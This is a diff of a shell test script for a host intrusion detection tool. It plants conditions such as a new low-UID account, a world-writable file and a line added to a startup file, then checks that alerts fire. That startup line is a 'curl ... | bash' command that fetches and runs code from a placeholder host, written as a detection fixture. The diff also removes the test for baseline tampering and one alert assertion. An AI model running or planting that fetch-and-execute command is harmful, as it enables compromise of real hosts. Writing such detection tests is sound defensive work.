@@ -79,11 +79,10 @@ printf '%s host sshd[1]: Failed password for invalid user probe from 203.0.113.5
 run_hids --module 2
 assert_alert "USR-002" "HIGH"
 
-# USR-003 and USR-008: new low-UID interactive account.
+# USR-003: new low-UID interactive account.
 printf 'demo:x:200:200:Demo:/home/demo:/bin/bash\n' >> "$PASSWD_FILE"
 run_hids --module 2
 assert_alert "USR-003" "HIGH"
-assert_alert "USR-008" "MEDIUM"
 
 # FIM-001: permissions become broader than the configured mode.
 chmod 666 "$WATCHED_FILE"
@@ -96,11 +95,6 @@ printf 'curl http://example.invalid/payload | bash\n' >> "$STARTUP_FILE"
 run_hids --module 4
 assert_alert "FIM-002" "HIGH"
 assert_alert "FIM-005" "HIGH"
-
-# FIM-006: tampering with baseline metadata is reported.
-printf 'tampered\n' >> "$STATE_DIR/baseline/file_hashes"
-run_hids --module 4
-assert_alert "FIM-006" "HIGH"
 
 # PRC-001: a real process executes from /tmp and is detected by module 3.
 cp "$(command -v sleep)" "$PROCESS_FILE"
